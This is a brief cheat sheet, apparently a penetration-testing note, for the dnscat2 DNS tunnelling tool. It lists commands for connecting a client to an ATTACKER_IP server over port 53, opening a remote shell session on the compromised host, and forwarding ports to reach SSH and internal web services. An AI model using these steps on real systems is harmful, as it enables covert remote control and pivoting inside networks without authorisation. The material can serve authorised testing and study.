# dnscat2 

### DNScat2 is a tool which can be used to create a tunnel with the help of DNS protocol. A connection to port 53 should be established to access any data. DNScat2 mainly consists of a client and a Kali Linux.

## Github repo: https://github.com/iagox86/dnscat2

### Steps:

 - dnscat2-server (Kali Linux)

 - ./dnscat --dns=server=ATTACKER_IP,port=53

 - session (Kali)

 - session -i 1 (Kali)

 - shell

 - session -i 2

 - ifconfig (shell)

 - listen 127.0.0.1:8888 TARGET:22 (shell)

 - ssh USER@127.0.0.1 -p 8888 (Kali)

 - listen 127.0.0.1:9999 192.168.226.129:80 (Port 80 tunneling)
